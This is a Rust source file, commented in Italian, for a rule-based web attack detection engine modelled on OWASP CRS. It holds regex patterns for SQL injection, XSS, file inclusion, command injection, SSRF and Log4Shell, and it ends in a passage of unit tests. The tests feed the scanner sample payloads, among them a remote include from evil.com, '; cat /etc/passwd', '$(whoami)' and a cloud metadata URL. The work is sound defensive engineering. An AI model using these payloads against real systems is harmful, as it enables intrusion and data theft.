//! F10 (2026-06-02): OWASP CRS-like rule-based pattern engine.
//!
//! Layer 1.5 — sit fra rate_limit/ip_intel (Layer 1) e ML neural (Layer 2).
//! Cattura attack pattern noti via regex (~50 regole top-priority) sui campi:
//!   - request.path (URL + query)
//!   - request body raw (se presente)
//!   - request.headers (User-Agent, Referer, etc.)
//!
//! Filosofia:
//!   - High precision (severity 0.95) → false positive minimi
//!   - Compilato once (lazy_static) → zero allocation per request
//!   - Word boundaries + case-insensitive → resilient a obfuscation triviale
//!   - 11 categorie OWASP Top 10 2021 + CVE famosi (Log4Shell, Spring4Shell, ecc.)
//!
//! Source set rules: distillazione personale da CRS 4.x baseline +
//! Cloudflare Managed Rules public docs + 2026 CVE feed.

use arc_swap::ArcSwap;
use once_cell::sync::Lazy;
use regex::RegexSet;
use serde::Serialize;
use std::sync::Arc;

/// Categorie di attacco riconosciute dal pattern engine.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum AttackCategory {
    SqlInjection,
    XssReflected,
    XssStored,
    PathTraversal,
    LocalFileInclusion,
    RemoteFileInclusion,
    CommandInjection,
    Ssrf,
    Log4Shell,
    NoSqlInjection,
    PrototypePollution,
    Deserialization,
    XmlExternalEntity,
    Spring4Shell,
    OgnlInjection,
    TemplateInjection,
    /// G4 (2026-06-02): CVE-2023-44487 — HTTP/2 Rapid Reset DDoS
    Http2RapidReset,
    /// G6 (2026-06-02): WebSocket abuse — Origin spoof, payload oversize, key entropy
    WebSocketAbuse,
    /// G7 (2026-06-02): GraphQL depth/complexity DDoS — nested query bomba
    GraphqlDepthAbuse,
    /// G10 (2026-06-02): DNS rebinding probe — esterno→privato switch
    DnsRebinding,
}

impl AttackCategory {
    pub fn rule_id(&self) -> &'static str {
        match self {
            Self::SqlInjection => "owasp.sqli",
            Self::XssReflected => "owasp.xss_reflected",
            Self::XssStored => "owasp.xss_stored",
            Self::PathTraversal => "owasp.path_traversal",
            Self::LocalFileInclusion => "owasp.lfi",
            Self::RemoteFileInclusion => "owasp.rfi",
            Self::CommandInjection => "owasp.cmd_injection",
            Self::Ssrf => "owasp.ssrf",
            Self::Log4Shell => "cve.log4shell",
            Self::NoSqlInjection => "owasp.nosqli",
            Self::PrototypePollution => "owasp.proto_pollution",
            Self::Deserialization => "owasp.deserialization",
            Self::XmlExternalEntity => "owasp.xxe",
            Self::Spring4Shell => "cve.spring4shell",
            Self::OgnlInjection => "owasp.ognl",
            Self::TemplateInjection => "owasp.template_injection",
            Self::Http2RapidReset => "cve.http2_rapid_reset",
            Self::WebSocketAbuse => "owasp.websocket_abuse",
            Self::GraphqlDepthAbuse => "owasp.graphql_depth_abuse",
            Self::DnsRebinding => "owasp.dns_rebinding",
        }
    }

    pub fn human_description(&self, matched_input: &str) -> String {
        let prefix = match self {
            Self::SqlInjection => "Pattern SQL injection rilevato (UNION/SELECT/OR 1=1/sleep) — tentativo di estrarre dati o bypassare auth via query SQL maliziosa",
            Self::XssReflected => "Pattern XSS riflesso (script tag/javascript:/event handler) — tentativo di iniettare JavaScript nel browser delle vittime",
            Self::XssStored => "Pattern XSS stored (script/iframe/svg-onload) — tentativo di salvare payload persistente nel database",
            Self::PathTraversal => "Path traversal — tentativo di leggere file fuori dalla webroot via ../",
            Self::LocalFileInclusion => "Local File Inclusion — tentativo di leggere /etc/passwd, /proc/self/environ, .env, config server",
            Self::RemoteFileInclusion => "Remote File Inclusion — tentativo di caricare script remoto via URL (http://, ftp://, data:)",
            Self::CommandInjection => "Command injection — tentativo di eseguire comandi shell via metacaratteri (; | & $ backtick)",
            Self::Ssrf => "Server-Side Request Forgery — tentativo di forzare il server a contattare metadata cloud (169.254.169.254, localhost interni, file://)",
            Self::Log4Shell => "CVE-2021-44228 Log4Shell — payload JNDI:ldap/jndi:rmi per RCE via Log4j",
            Self::NoSqlInjection => "NoSQL injection — operatori MongoDB ($ne, $gt, $where, $regex) iniettati in input",
            Self::PrototypePollution => "Prototype pollution JavaScript — __proto__, constructor.prototype manipulation",
            Self::Deserialization => "Insecure deserialization — payload rO0AB (Java) / O:8 (PHP) / pickle.loads (Python)",
            Self::XmlExternalEntity => "XXE — XML External Entity injection via <!ENTITY SYSTEM>",
            Self::Spring4Shell => "CVE-2022-22965 Spring4Shell — class.module.classLoader manipulation",
            Self::OgnlInjection => "OGNL injection (Apache Struts) — %{...} expression evaluation",
            Self::TemplateInjection => "Server-Side Template Injection (SSTI) — Jinja2/Twig/Freemarker {{...}} payload",
            Self::Http2RapidReset => "CVE-2023-44487 HTTP/2 Rapid Reset — burst di stream HTTP/2 immediatamente seguiti da RST_STREAM per esaurire risorse server (vettore DDoS 2023 che ha colpito Google/Cloudflare/AWS)",
            Self::WebSocketAbuse => "WebSocket abuse — header anomali: Sec-WebSocket-Key entropia bassa, Origin esterno non whitelisted, payload size oversize, extension non standard (per smuggling/CSWSH)",
            Self::GraphqlDepthAbuse => "GraphQL depth/complexity bomb — query nested oltre 10 livelli o > 50 alias (DoS server resolver)",
            Self::DnsRebinding => "DNS rebinding probe — payload referenzia host che potrebbe risolvere a IP privato/metadata (TOCTOU attack su DNS resolver)",
        };
        let trimmed = matched_input.chars().take(120).collect::<String>();
        format!("{prefix}. Input intercettato: '{trimmed}'.")
    }
}

/// Risultato detection dal pattern engine.
#[derive(Debug, Clone, Serialize)]
pub struct PatternMatch {
    pub category: AttackCategory,
    /// Surface dove il match e\` avvenuto.
    pub surface: &'static str,
    /// Match span ridotto (max 200 char) per logging.
    pub matched_excerpt: String,
}

// ─── Pattern library ───────────────────────────────────────────────────
//
// IMPORTANTE: regex compilate via RegexSet → un singolo scan O(n) lineare
// nel input vs O(n*m) loop manuale. ~50 pattern scansionati in < 100us.
//
// Categorie ordinate per AttackCategory enum index (per matchare di nuovo
// da idx → enum via lookup table sotto).

/// Ordine match → AttackCategory. DEVE allineare con PATTERN_LIST.
const CATEGORY_LOOKUP: &[AttackCategory] = &[
    // SQL injection (8 pattern)
    AttackCategory::SqlInjection, AttackCategory::SqlInjection, AttackCategory::SqlInjection,
    AttackCategory::SqlInjection, AttackCategory::SqlInjection, AttackCategory::SqlInjection,
    AttackCategory::SqlInjection, AttackCategory::SqlInjection,
    // XSS reflected (4)
    AttackCategory::XssReflected, AttackCategory::XssReflected,
    AttackCategory::XssReflected, AttackCategory::XssReflected,
    // XSS stored (3)
    AttackCategory::XssStored, AttackCategory::XssStored, AttackCategory::XssStored,
    // Path traversal (3)
    AttackCategory::PathTraversal, AttackCategory::PathTraversal, AttackCategory::PathTraversal,
    // LFI (4)
    AttackCategory::LocalFileInclusion, AttackCategory::LocalFileInclusion,
    AttackCategory::LocalFileInclusion, AttackCategory::LocalFileInclusion,
    // RFI (3)
    AttackCategory::RemoteFileInclusion, AttackCategory::RemoteFileInclusion,
    AttackCategory::RemoteFileInclusion,
    // Command injection (5)
    AttackCategory::CommandInjection, AttackCategory::CommandInjection,
    AttackCategory::CommandInjection, AttackCategory::CommandInjection,
    AttackCategory::CommandInjection,
    // SSRF (4)
    AttackCategory::Ssrf, AttackCategory::Ssrf, AttackCategory::Ssrf, AttackCategory::Ssrf,
    // Log4Shell (2)
    AttackCategory::Log4Shell, AttackCategory::Log4Shell,
    // NoSQLi (3)
    AttackCategory::NoSqlInjection, AttackCategory::NoSqlInjection, AttackCategory::NoSqlInjection,
    // Prototype pollution (2)
    AttackCategory::PrototypePollution, AttackCategory::PrototypePollution,
    // Deserialization (3)
    AttackCategory::Deserialization, AttackCategory::Deserialization, AttackCategory::Deserialization,
    // XXE (2)
    AttackCategory::XmlExternalEntity, AttackCategory::XmlExternalEntity,
    // Spring4Shell (1)
    AttackCategory::Spring4Shell,
    // OGNL (2)
    AttackCategory::OgnlInjection, AttackCategory::OgnlInjection,
    // Template injection (3)
    AttackCategory::TemplateInjection, AttackCategory::TemplateInjection,
    AttackCategory::TemplateInjection,
    // G4 (2026-06-02): HTTP/2 Rapid Reset CVE-2023-44487 (2 pattern)
    AttackCategory::Http2RapidReset, AttackCategory::Http2RapidReset,
    // G6 (2026-06-02): WebSocket abuse (3 pattern)
    AttackCategory::WebSocketAbuse, AttackCategory::WebSocketAbuse, AttackCategory::WebSocketAbuse,
    // G7 (2026-06-02): GraphQL depth abuse (2 pattern)
    AttackCategory::GraphqlDepthAbuse, AttackCategory::GraphqlDepthAbuse,
    // G10 (2026-06-02): DNS rebinding (2 pattern)
    AttackCategory::DnsRebinding, AttackCategory::DnsRebinding,
];

/// 52 pattern OWASP Top 10 + CVE famosi (2021-2026).
/// Tutti case-insensitive (RegexSet con `(?i)`).
const PATTERN_LIST: &[&str] = &[
    // ── SQL injection (8) ─────────────────────────────────────────────
    r"(?i)\bunion\s+(?:all\s+)?select\b",
    r"(?i)'(?:\s|\+|%20)*or(?:\s|\+|%20)+'?\d+'?(?:\s|\+|%20)*=(?:\s|\+|%20)*'?\d+",
    r"(?i)\bor(?:\s|\+|%20)+1(?:\s|\+|%20)*=(?:\s|\+|%20)*1\b",
    r"(?i)\b(?:select|insert|update|delete|drop|alter)\s+.{0,30}(?:from|into|table)\b",
    r"(?i);(?:\s|\+|%20)*(?:waitfor(?:\s|\+|%20)+delay|sleep|benchmark|pg_sleep)(?:\s|\(|')",
    r"(?i)\bextractvalue\s*\(",
    r"(?i)\binformation_schema\.(?:tables|columns)",
    r"(?i)0x[0-9a-f]{16,}",            // hex blob injection
    // ── XSS reflected (4) ─────────────────────────────────────────────
    r"(?i)<\s*script[\s>]",
    r"(?i)\bjavascript\s*:\s*[a-z]",
    r"(?i)\bon(?:error|load|click|mouseover|focus|blur)\s*=",
    r#"(?i)<\s*img[^>]*\bsrc\s*=\s*['"]?\s*[jx]"#,
    // ── XSS stored (3) ────────────────────────────────────────────────
    r"(?i)<\s*iframe[\s>]",
    r"(?i)<\s*svg[^>]*\bonload\s*=",
    r"(?i)<\s*body[^>]*\bonload\s*=",
    // ── Path traversal (3) ────────────────────────────────────────────
    r"\.\.[/\\]",
    r"%2e%2e[/\\%]",
    r"%252e%252e",
    // ── LFI (4) ───────────────────────────────────────────────────────
    r"/etc/(?:passwd|shadow|hosts|sudoers)\b",
    r"/proc/self/(?:environ|cmdline|status|maps|fd/\d+)",
    r"\\windows\\system32\\drivers\\etc\\hosts",
    r"php://(?:filter|input|memory|temp)",
    // ── RFI (3) ───────────────────────────────────────────────────────
    r"(?i)=\s*https?://[a-z0-9.-]+/[^&\s]*\.(?:php|jsp|asp|aspx|txt)",
    r"(?i)=\s*ftp://",
    r"(?i)=\s*data:text/(?:html|javascript)",
    // ── Command injection (5) ─────────────────────────────────────────
    r"(?:;|\|\||&&|\|)\s*(?:cat|ls|id|whoami|uname|pwd|curl|wget|nc|ping)\s",
    r"\$\([^)]+\)",                    // $(cmd) command substitution
    r"`[^`]{2,}`",                     // `cmd` backticks
    r"(?i)\bbash\s+-[ic]\b",
    r"(?i)\bperl\s+-e\b",
    // ── SSRF (4) ──────────────────────────────────────────────────────
    r"169\.254\.169\.254",             // AWS/GCP/Azure metadata
    r"100\.100\.100\.200",             // Alibaba metadata
    r"(?i)\b(?:localhost|127\.0\.0\.1|0\.0\.0\.0|::1)\b.{0,50}:(?:6379|3306|5432|11211|2375|9200)",
    r"(?i)\bfile://",
    // ── Log4Shell CVE-2021-44228 (2) ──────────────────────────────────
    r"(?i)\$\{jndi:(?:ldap|rmi|dns|iiop|corba|nis)",
    r"(?i)\$\{(?:lower|upper|sys|env|date):.{0,40}jndi",
    // ── NoSQL injection (3) ───────────────────────────────────────────
    r#"(?i)"\$(?:ne|gt|lt|gte|lte|in|nin|exists|regex|where|or|and)"\s*:"#,
    r"(?i)\[\$(?:ne|gt|lt|where)\]",
    r"(?i)this\.password\s*==",
    // ── Prototype pollution (2) ───────────────────────────────────────
    r#"(?i)"__proto__"\s*:"#,
    r#"(?i)"constructor"\s*:\s*\{\s*"prototype""#,
    // ── Deserialization (3) ───────────────────────────────────────────
    r"rO0AB[\w+/]{8,}",                // Java serialized blob base64
    r#"(?i)O:\d+:"[a-z_][a-z0-9_]*":\d+:\{"#, // PHP serialized
    r"(?i)\bpickle\.loads?\s*\(",      // Python pickle
    // ── XXE (2) ───────────────────────────────────────────────────────
    r"(?i)<!entity[^>]+system\s+",
    r"(?i)<!doctype[^>]+\[\s*<!entity",
    // ── Spring4Shell CVE-2022-22965 (1) ───────────────────────────────
    r"(?i)class\.module\.classLoader",
    // ── OGNL Apache Struts (2) ────────────────────────────────────────
    r"%\{[^}]*(?:#|@\w+@)",
    r"(?i)\$\{[^}]*runtime\.getruntime",
    // ── Template injection SSTI (3) ───────────────────────────────────
    r"\{\{\s*(?:config|request|self)\.",          // Jinja2 / Twig
    r#"\{\{\s*['"][^'"]{0,20}['"]\s*\*\s*7\s*\}\}"#, // {{ 'a'*7 }} probe
    r"#\{[^}]*(?:T\(|@)",                         // Spring SpEL
    // ── HTTP/2 Rapid Reset CVE-2023-44487 (2) ─────────────────────────
    // Detected via header markers che indicano fingerprint reset abuse:
    // 1. h2 client che dichiara header `:method: GET` + `Cache-Control:
    //    no-store, must-revalidate` (tipico di proxy DDoS rapid-reset)
    r"(?i):method[^A-Z]+(?:get|post)[\s\S]{0,100}rapid[_-]?reset",
    // 2. User-Agent fingerprint dei tool noti (h2load DDoS profile, custom abuse libs)
    r"(?i)(?:h2load|nGrinder|stream-flood|reset-flood|HTTP/2-stress)",
    // ── WebSocket abuse G6 (3) — pattern su VALUE (NO header name) ────
    // 1. Sec-WebSocket-Key entropy bassa: 16+ char ripetuto stessa lettera/cifra
    r"(?i)^(?:A{16,}|a{16,}|0{16,}|1{16,}|test|admin)(?:=*)$",
    // 2. Sec-WebSocket-Extensions custom non standard (smuggling probe)
    r"(?i)\b(?:smuggle|smuggle-frames|inject-frame|bypass-cors|raw-bytes|eval-frame)\b",
    // 3. Sec-WebSocket-Protocol che richiede capability privilegiate
    r"(?i)^(?:admin|root|debug|internal|system)(?:[,;\s]|$)",
    // ── GraphQL depth/complexity G7 (2) ───────────────────────────────
    // 1. Query con > 10 livelli nested (regex conta { in sequenza)
    r"\{(?:[^{}]*\{){10,}",
    // 2. Alias bomba — > 50 alias `key: field`
    r"(?:[a-z_][a-z0-9_]*:\s*[a-z_][a-z0-9_]*\s*[,}]\s*){50,}",
    // ── DNS rebinding G10 (2) ─────────────────────────────────────────
    // 1. Hostname embedded che termina con .nip.io / .xip.io / .sslip.io (rebinding services noti)
    r"(?i)[a-z0-9.-]+\.(?:nip\.io|xip\.io|sslip\.io|rebind\.network|rbndr\.us)",
    // 2. URL con sintassi 0.0.0.0/N hex/numero che maschera IP privato
    r"(?i)(?:0x|0)\d{8,}|0\.0\.0\.0",
];

/// G2 (2026-06-02): runtime CRS bundle — RegexSet + lookup table coppia atomica.
/// Swap atomico via ArcSwap → zero-downtime hot-reload (no locks per scan_request).
#[derive(Clone, Debug)]
pub struct CrsBundle {
    pub regex: Arc<RegexSet>,
    pub lookup: Arc<Vec<AttackCategory>>,
    pub patterns_count: usize,
    pub source: &'static str, // "builtin" o "file:<path>"
}

impl CrsBundle {
    fn builtin() -> Self {
        Self {
            regex: Arc::new(RegexSet::new(PATTERN_LIST).expect("F10: CRS builtin must compile")),
            lookup: Arc::new(CATEGORY_LOOKUP.to_vec()),
            patterns_count: PATTERN_LIST.len(),
            source: "builtin",
        }
    }
}

static CRS_BUNDLE: Lazy<ArcSwap<CrsBundle>> = Lazy::new(|| ArcSwap::from_pointee(CrsBundle::builtin()));

/// G22 (2026-06-02): SHADOW bundle — pattern test paralleli che NON modificano
/// edge_score. Match registrato in `SHADOW_MATCHES` counter per dashboard,
/// nessun ban/flag. Permette A/B testing di nuovi pattern senza rischio
/// false-positive in produzione.
static SHADOW_BUNDLE: Lazy<ArcSwap<Option<CrsBundle>>> = Lazy::new(|| ArcSwap::from_pointee(None));

/// G22: counter dei match shadow per rule_id → category. Esposto via /sla.
static SHADOW_MATCHES: Lazy<dashmap::DashMap<&'static str, std::sync::atomic::AtomicU64>> =
    Lazy::new(dashmap::DashMap::new);

/// G22: imposta shadow bundle (parallel test). None = disabilita shadow.
pub fn set_shadow_bundle(bundle: Option<CrsBundle>) {
    SHADOW_BUNDLE.store(Arc::new(bundle));
    tracing::info!("G22: shadow bundle updated");
}

/// G22: stats shadow per dashboard A/B compare.
pub fn shadow_stats() -> Vec<(String, u64)> {
    SHADOW_MATCHES
        .iter()
        .map(|e| (e.key().to_string(), e.value().load(std::sync::atomic::Ordering::Relaxed)))
        .collect()
}

/// G22: reset counter (dopo deploy/test pulito)
pub fn shadow_stats_reset() {
    SHADOW_MATCHES.clear();
}

/// G22: scan via shadow bundle — log-only, NO score.
fn scan_surface_shadow(input: &str, surface: &'static str) {
    let bundle_guard = SHADOW_BUNDLE.load();
    if let Some(bundle) = bundle_guard.as_ref() {
        let matches = bundle.regex.matches(input);
        for idx in matches.iter() {
            if let Some(category) = bundle.lookup.get(idx) {
                let key: &'static str = match category {
                    AttackCategory::SqlInjection => "shadow.sqli",
                    AttackCategory::XssReflected => "shadow.xss_reflected",
                    AttackCategory::XssStored => "shadow.xss_stored",
                    AttackCategory::PathTraversal => "shadow.path_traversal",
                    AttackCategory::LocalFileInclusion => "shadow.lfi",
                    AttackCategory::RemoteFileInclusion => "shadow.rfi",
                    AttackCategory::CommandInjection => "shadow.cmd",
                    AttackCategory::Ssrf => "shadow.ssrf",
                    AttackCategory::Log4Shell => "shadow.log4shell",
                    AttackCategory::NoSqlInjection => "shadow.nosqli",
                    AttackCategory::PrototypePollution => "shadow.proto",
                    AttackCategory::Deserialization => "shadow.deser",
                    AttackCategory::XmlExternalEntity => "shadow.xxe",
                    AttackCategory::Spring4Shell => "shadow.spring4shell",
                    AttackCategory::OgnlInjection => "shadow.ognl",
                    AttackCategory::TemplateInjection => "shadow.ssti",
                    AttackCategory::Http2RapidReset => "shadow.h2_rapid_reset",
                    AttackCategory::WebSocketAbuse => "shadow.ws_abuse",
                    AttackCategory::GraphqlDepthAbuse => "shadow.graphql",
                    AttackCategory::DnsRebinding => "shadow.dns_rebind",
                };
                SHADOW_MATCHES.entry(key)
                    .or_insert_with(|| std::sync::atomic::AtomicU64::new(0))
                    .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                tracing::debug!(
                    shadow_key = key,
                    surface = surface,
                    "G22: shadow CRS match (no-score)"
                );
            }
        }
    }
}

/// G2: hot-reload — swap atomico nuovo bundle. Caller responsibility la
/// validazione (compile-test prima di swap).
pub fn swap_crs_bundle(new_bundle: CrsBundle) {
    let count = new_bundle.patterns_count;
    let source = new_bundle.source;
    CRS_BUNDLE.store(Arc::new(new_bundle));
    tracing::info!(patterns = count, source = source, "G2: CRS bundle hot-swapped");
}

/// G2: snapshot del bundle attivo (read-only).
pub fn current_crs_bundle() -> Arc<CrsBundle> {
    CRS_BUNDLE.load_full()
}

/// G2: parse-only — costruisce CrsBundle SENZA swap. Pure function, no
/// side-effect. Test la usano in isolamento per validate edge cases SENZA
/// race su static CRS_BUNDLE.
pub fn parse_crs_file(path: &std::path::Path) -> Result<CrsBundle, String> {
    let content = std::fs::read_to_string(path).map_err(|e| format!("read: {e}"))?;
    let mut new_patterns = Vec::new();
    let mut new_lookup = Vec::new();
    for (i, line) in content.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') { continue; }
        let (cat_str, pattern) = line.split_once('|').ok_or_else(||
            format!("line {}: format atteso `<category>|<regex>`", i + 1))?;
        let category = match cat_str.trim() {
            "sqli" => AttackCategory::SqlInjection,
            "xss_reflected" => AttackCategory::XssReflected,
            "xss_stored" => AttackCategory::XssStored,
            "path_traversal" => AttackCategory::PathTraversal,
            "lfi" => AttackCategory::LocalFileInclusion,
            "rfi" => AttackCategory::RemoteFileInclusion,
            "cmd_injection" => AttackCategory::CommandInjection,
            "ssrf" => AttackCategory::Ssrf,
            "log4shell" => AttackCategory::Log4Shell,
            "nosqli" => AttackCategory::NoSqlInjection,
            "proto_pollution" => AttackCategory::PrototypePollution,
            "deserialization" => AttackCategory::Deserialization,
            "xxe" => AttackCategory::XmlExternalEntity,
            "spring4shell" => AttackCategory::Spring4Shell,
            "ognl" => AttackCategory::OgnlInjection,
            "template_injection" => AttackCategory::TemplateInjection,
            "http2_rapid_reset" => AttackCategory::Http2RapidReset,
            "websocket_abuse" => AttackCategory::WebSocketAbuse,
            "graphql_depth_abuse" => AttackCategory::GraphqlDepthAbuse,
            "dns_rebinding" => AttackCategory::DnsRebinding,
            other => return Err(format!("line {}: categoria sconosciuta '{}'", i + 1, other)),
        };
        new_patterns.push(pattern.to_string());
        new_lookup.push(category);
    }
    let regex = RegexSet::new(&new_patterns).map_err(|e| format!("RegexSet build: {e}"))?;
    let count = new_patterns.len();
    Ok(CrsBundle {
        regex: Arc::new(regex),
        lookup: Arc::new(new_lookup),
        patterns_count: count,
        source: "file",
    })
}

/// G2: parse + swap. Wrapper per uso produzione (file watcher / init).
pub fn try_load_crs_from_file(path: &std::path::Path) -> Result<usize, String> {
    let bundle = parse_crs_file(path)?;
    let count = bundle.patterns_count;
    swap_crs_bundle(bundle);
    Ok(count)
}

/// Scan multi-surface (path + headers + body) per pattern attack.
/// Ritorna il PRIMO match (deduplication by category) — sufficiente per
/// triggerare ban; il workflow non ha bisogno di enumerare tutti i match.
///
/// G22: in PARALLELO scan il SHADOW bundle (no-score) per A/B test.
pub fn scan_request(
    path: &str,
    headers: &std::collections::HashMap<String, String>,
    body: Option<&str>,
) -> Option<PatternMatch> {
    // G22: shadow scan parallelo — log-only, NON early-return.
    scan_surface_shadow(path, "path");
    for (key, val) in headers.iter() {
        scan_surface_shadow(val, match key.as_str() {
            "user-agent" => "user-agent",
            "referer" => "referer",
            "cookie" => "cookie",
            _ => "header",
        });
    }
    if let Some(b) = body {
        scan_surface_shadow(b, "body");
    }

    // Path + query — RAW
    if let Some(m) = scan_surface(path, "path") {
        return Some(m);
    }
    // Path + query — DECODIFICATO (anti-evasion): un payload percent-encodato
    // (`%3Cscript%3E`, `%27%20OR%201%3D1`, doppio-encoding `%253C`) passa il match sul
    // RAW ma viene decodificato a valle (Hono/Node) ed ESEGUITO. Decodifichiamo
    // (iterativo, depth-cap 3) e ri-scansioniamo SOLO se differisce dal raw (no doppio
    // lavoro sul caso comune senza '%'). Le CRS regex sono già `(?i)` → niente lowercase.
    let decoded_path = sentinel_core::percent_decode_iterative(path, 3);
    if decoded_path != path {
        if let Some(m) = scan_surface(&decoded_path, "path-decoded") {
            return Some(m);
        }
    }
    // User-Agent, Referer, X-Forwarded-Host, Cookie + WebSocket headers (G6).
    for key in &[
        "user-agent", "referer", "x-forwarded-host", "cookie", "x-original-url",
        // G6 (2026-06-02): scan WebSocket negotiation headers
        "sec-websocket-key", "sec-websocket-protocol", "sec-websocket-extensions",
        "origin",
    ] {
        if let Some(val) = headers.get(*key) {
            if let Some(m) = scan_surface(val, key) {
                return Some(m);
            }
        }
    }
    // Body raw (limita a 8KB per evitare O(n) gigante su upload). FP2 (CRITICO):
    // char-boundary-safe — `&b[..8192]` panicava se un carattere multibyte (JSON con
    // emoji/€/CJK) cadeva sul byte 8192 → crash del CRS scanner su quella request.
    if let Some(b) = body {
        let truncated = sentinel_core::truncate_char_boundary(b, 8192);
        if let Some(m) = scan_surface(truncated, "body") {
            return Some(m);
        }
        // Body DECODIFICATO (stesso anti-evasion del path): payload percent-encodato nel
        // body form-urlencoded. Ri-scansiona solo se differisce dal raw troncato.
        let decoded_body = sentinel_core::percent_decode_iterative(truncated, 3);
        if decoded_body != truncated {
            if let Some(m) = scan_surface(&decoded_body, "body-decoded") {
                return Some(m);
            }
        }
    }
    None
}

fn scan_surface(input: &str, surface: &'static str) -> Option<PatternMatch> {
    // G2: leggi atomic snapshot del bundle attivo (zero locking).
    let bundle = CRS_BUNDLE.load();
    let matches = bundle.regex.matches(input);
    let idx = matches.iter().next()?;
    let category = *bundle.lookup.get(idx)?;
    Some(PatternMatch {
        category,
        surface,
        matched_excerpt: input.chars().take(200).collect(),
    })
}

/// Categoria → severity score (calibrato per livello pericolo).
/// Tutti >= 0.85 → escape hatch fa scattare High → ban.
pub fn category_severity(c: AttackCategory) -> f64 {
    match c {
        // Critical CVE: tutti 0.99 (near-certainty)
        AttackCategory::Log4Shell | AttackCategory::Spring4Shell | AttackCategory::Http2RapidReset => 0.99,
        // High-impact ezecuzione codice / lettura file critici
        AttackCategory::CommandInjection
        | AttackCategory::LocalFileInclusion
        | AttackCategory::RemoteFileInclusion
        | AttackCategory::Deserialization
        | AttackCategory::Ssrf => 0.95,
        // Injection classiche
        AttackCategory::SqlInjection
        | AttackCategory::NoSqlInjection
        | AttackCategory::PrototypePollution
        | AttackCategory::XmlExternalEntity
        | AttackCategory::OgnlInjection
        | AttackCategory::TemplateInjection => 0.92,
        // XSS / path traversal: ancora gravi ma score leggermente piu\` basso
        AttackCategory::XssReflected | AttackCategory::XssStored => 0.90,
        AttackCategory::PathTraversal => 0.88,
        // G6/G7/G10 protocol-level + DNS abuse (high-confidence)
        AttackCategory::WebSocketAbuse | AttackCategory::DnsRebinding => 0.92,
        AttackCategory::GraphqlDepthAbuse => 0.90,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    fn empty_headers() -> HashMap<String, String> {
        HashMap::new()
    }

    // ── SQL injection ─────────────────────────────────────────────────
    #[test]
    fn sqli_union_select_in_path() {
        let m = scan_request("/users?id=1 UNION SELECT password FROM users", &empty_headers(), None)
            .expect("must detect UNION SELECT");
        assert_eq!(m.category, AttackCategory::SqlInjection);
    }

    #[test]
    fn sqli_or_1_eq_1() {
        let m = scan_request("/login?u=admin'+OR+1=1--", &empty_headers(), None).expect("must detect OR 1=1");
        assert_eq!(m.category, AttackCategory::SqlInjection);
    }

    #[test]
    fn sqli_sleep_payload() {
        let m = scan_request("/api?id=1;WAITFOR DELAY '0:0:5'--", &empty_headers(), None).expect("waitfor delay");
        assert_eq!(m.category, AttackCategory::SqlInjection);
    }

    #[test]
    fn sqli_information_schema() {
        let m = scan_request("/x?q=information_schema.tables", &empty_headers(), None).expect("info schema");
        assert_eq!(m.category, AttackCategory::SqlInjection);
    }

    // ── XSS ────────────────────────────────────────────────────────────
    #[test]
    fn xss_script_tag_in_query() {
        let m = scan_request("/search?q=<script>alert(1)</script>", &empty_headers(), None).expect("xss");
        assert_eq!(m.category, AttackCategory::XssReflected);
    }

    #[test]
    fn xss_javascript_url() {
        let m = scan_request("/redirect?url=javascript:alert(1)", &empty_headers(), None).expect("js: url");
        assert_eq!(m.category, AttackCategory::XssReflected);
    }

    #[test]
    fn xss_onerror_handler() {
        let m = scan_request("/x?p=<img onerror=alert(1) src=x>", &empty_headers(), None).expect("onerror");
        assert!(matches!(m.category, AttackCategory::XssReflected));
    }

    #[test]
    fn xss_iframe_in_body() {
        let body = r#"{"comment":"<iframe src=evil></iframe>"}"#;
        let m = scan_request("/post-comment", &empty_headers(), Some(body)).expect("iframe");
        assert_eq!(m.category, AttackCategory::XssStored);
    }

    // ── Path traversal / LFI ──────────────────────────────────────────
    #[test]
    fn path_traversal_dot_dot_slash() {
        let m = scan_request("/files/../../etc/passwd", &empty_headers(), None).expect("..");
        // First-match wins: path_traversal o LFI in base all'ordine
        assert!(matches!(
            m.category,
            AttackCategory::PathTraversal | AttackCategory::LocalFileInclusion
        ));
    }

    #[test]
    fn lfi_etc_passwd() {
        let m = scan_request("/?file=/etc/passwd", &empty_headers(), None).expect("/etc/passwd");
        assert!(matches!(
            m.category,
            AttackCategory::LocalFileInclusion | AttackCategory::PathTraversal
        ));
    }

    #[test]
    fn lfi_proc_self_environ() {
        let m = scan_request("/?inc=/proc/self/environ", &empty_headers(), None).expect("/proc/self");
        assert_eq!(m.category, AttackCategory::LocalFileInclusion);
    }

    #[test]
    fn lfi_php_filter_wrapper() {
        let m = scan_request("/?file=php://filter/read=convert.base64-encode/resource=index.php", &empty_headers(), None)
            .expect("php://filter");
        assert_eq!(m.category, AttackCategory::LocalFileInclusion);
    }

    // ── RFI ────────────────────────────────────────────────────────────
    #[test]
    fn rfi_remote_php_inclusion() {
        let m = scan_request("/?page=http://evil.com/shell.php", &empty_headers(), None).expect("rfi");
        assert_eq!(m.category, AttackCategory::RemoteFileInclusion);
    }

    // ── Command injection ──────────────────────────────────────────────
    #[test]
    fn cmd_injection_semicolon_cat() {
        let m = scan_request("/ping?host=8.8.8.8; cat /etc/passwd", &empty_headers(), None).expect("cmd");
        // First match: LFI o command — entrambi accettabili
        assert!(matches!(
            m.category,
            AttackCategory::CommandInjection | AttackCategory::LocalFileInclusion
        ));
    }

    #[test]
    fn cmd_injection_dollar_paren() {
        let m = scan_request("/api?x=$(whoami)", &empty_headers(), None).expect("$()");
        assert_eq!(m.category, AttackCategory::CommandInjection);
    }

    #[test]
    fn cmd_injection_backticks() {
        let m = scan_request("/api?x=`id`", &empty_headers(), None).expect("backticks");
        assert_eq!(m.category, AttackCategory::CommandInjection);
    }

    // ── SSRF ───────────────────────────────────────────────────────────
    #[test]
    fn ssrf_aws_metadata() {
        let m = scan_request("/proxy?url=http://169.254.169.254/latest/meta-data/", &empty_headers(), None)
            .expect("aws metadata");
        assert_eq!(m.category, AttackCategory::Ssrf);
    }

    #[test]
    fn ssrf_file_scheme() {
        // /etc/shadow puo\` matchare LFI prima (first-match in RegexSet).
        // Entrambe le categorie indicano attacco → entrambe accettabili.
        let m = scan_request("/?u=file:///etc/shadow", &empty_headers(), None).expect("file:// scheme");
        assert!(matches!(
            m.category,
            AttackCategory::Ssrf | AttackCategory::LocalFileInclusion
        ));
    }

    #[test]
    fn ssrf_file_scheme_no_etc_passwd_collision() {
